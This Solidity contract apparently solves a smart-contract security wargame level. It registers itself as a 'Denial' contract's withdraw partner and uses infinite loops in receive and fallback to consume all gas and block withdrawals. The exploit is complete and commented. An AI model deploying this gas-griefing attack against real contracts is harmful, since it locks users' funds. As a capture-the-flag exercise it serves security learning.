// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 20. STOP
 * @dev DoS the withdraw function.
 */

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract Stop {
    IDenial idenial;

    constructor(address _denial) {
        idenial = IDenial(_denial);
    }

    // 1. Let's start by becoming a partner...
    function becomePartner() public {
        idenial.setWithdrawPartner(address(this));
    }

    // 2. Then making sure that we use all the gas upon receiving the ETH.
    // This useless infinite loop will effectively DoS the withdraw function.
    receive() external payable {
        while (true) {}
    }

    fallback() external payable {
        while (true) {}
    }
}
